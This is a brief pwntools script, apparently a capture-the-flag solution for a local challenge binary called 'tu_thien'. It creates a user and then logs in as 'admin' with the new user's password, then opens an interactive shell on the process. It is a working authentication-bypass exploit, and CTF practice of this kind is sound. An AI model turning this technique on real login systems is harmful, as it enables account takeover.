from pwn import *

io = process('./tu_thien')

def adduser(username, password):
    print(io.recvuntil(b'3. Thoat\n> '))
    io.sendline(str(1))
    print(io.recvuntil(b'[+] Username moi: '))
    io.sendline(username)
    print(io.recvuntil(b'[+] Password moi: '))
    io.sendline(password)

def login(username, password):
    print(io.recvuntil(b'3. Thoat\n> '))
    io.sendline(str(2))
    print(io.recvuntil(b'[+] Ten dang nhap: '))
    io.sendline(username)
    print(io.recvuntil(b'[+] Mat khau: '))
    io.sendline(password)

adduser(b'ok', b'pass')
login(b'admin', b'pass')
io.interactive()
